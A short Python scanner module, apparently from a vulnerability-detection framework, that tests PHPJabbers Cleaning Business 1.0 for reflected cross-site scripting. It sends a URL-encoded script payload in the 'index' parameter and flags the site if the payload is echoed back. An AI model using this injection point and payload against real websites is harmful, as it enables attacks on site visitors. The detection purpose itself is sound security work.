...
class Module(Scanner, Http_client):
    __info__ = {
        'name': 'PHPJabbers Cleaning Business 1.0 - Cross-Site Scripting Detection',
    ...
    def run(self):
        r = self.http_request(method="GET", path='/index.php?controller=pjFront&action=pjActionServices&locale=1&index=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('text/html',)
        body_all = ('Enquiry summary', '><script>alert(document.domain)</script>',)
        if (any(m in body for m in body_any)) and (all(m in body for m in body_all)):
            self.set_info(
                severity='medium',
                reason="PHPJabbers Cleaning Business 1.0 - Cross-Site Scripting detected",
                path='/index.php?controller=pjFront&action=pjActionServices&locale=1&index=%22%3E%3Cscript%3Ealert(document.domain)%3C/script%3E',
            )
            return True
        return False
